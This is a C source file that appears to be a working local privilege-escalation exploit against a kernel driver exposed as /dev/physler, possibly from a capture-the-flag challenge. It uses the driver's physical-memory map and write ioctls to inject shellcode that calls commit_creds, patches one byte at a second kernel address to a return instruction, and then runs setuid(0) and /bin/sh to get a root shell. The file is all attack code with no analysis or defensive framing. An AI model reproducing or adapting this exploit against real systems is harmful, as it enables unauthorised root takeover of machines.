#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_WRITE_PHYS_MEM 0x3003

#define BUF_SIZE 4096

unsigned char shellcode1[] = {0xe8,0x1c,0x02,0x9f,0x00,0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 ,0x90,0x90,0x90,0x90,0x90,0x90,
    0x48,0x89,0xC7,
    0xE8,0x57,0xC1,0x01,0x00, // call commit_creds
    0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x5D,0xC3};

// ./client 0x0110ddae 128

static struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

static struct ioctl_write {
    unsigned long size;
    unsigned char* in_data;
};

void check_error(int retval, const char *msg) {
    if (retval < 0) {
        perror(msg);
        exit(EXIT_FAILURE);
    }
}

void trigger() {
    setuid(0);
    system("/bin/sh");
};

int main(int argc, char **argv) {
    int fd;
    struct ioctl_map _map;
    struct ioctl_write _write;
    char buffer[BUF_SIZE] = {0};
    ssize_t bytes_written;

    fd = open("/dev/physler", O_RDWR);
    check_error(fd, "Failed to open device file");

    _map.phys_addr = 0x0110ddae;
    _map.size = sizeof(shellcode1);

    printf("Mapping physical address: 0x%lx, size: %lu bytes\n", _map.phys_addr, _map.size);
    check_error(ioctl(fd, IOCTL_MAP_PHYS_ADDR, &_map), "IOCTL_MAP_PHYS_ADDR failed");

    memcpy(buffer, shellcode1, sizeof(shellcode1));
    printf("Writing data to physical memory...\n");

    _write.in_data = buffer;
    _write.size = sizeof(shellcode1);
    bytes_written = ioctl(fd, IOCTL_WRITE_PHYS_MEM, &_write);
    check_error(bytes_written, "IOCTL_WRITE_PHYS_MEM failed");

    printf("Successfully wrote to physical memory.\n");
    close(fd);

    fd = open("/dev/physler", O_RDWR);
    check_error(fd, "Failed to open device file");

    _map.phys_addr = 0x01afdfdb;
    _map.size = 1;

    printf("Mapping physical address: 0x%lx, size: %lu bytes\n", _map.phys_addr, _map.size);
    check_error(ioctl(fd, IOCTL_MAP_PHYS_ADDR, &_map), "IOCTL_MAP_PHYS_ADDR failed");

    memcpy(buffer, "\xc3", 1);
    printf("Writing data to physical memory...\n");

    _write.in_data = buffer;
    _write.size = 1;
    bytes_written = ioctl(fd, IOCTL_WRITE_PHYS_MEM, &_write);
    check_error(bytes_written, "IOCTL_WRITE_PHYS_MEM failed");

    printf("Successfully wrote to physical memory.\n");
    close(fd);

    trigger();
    return 0;
}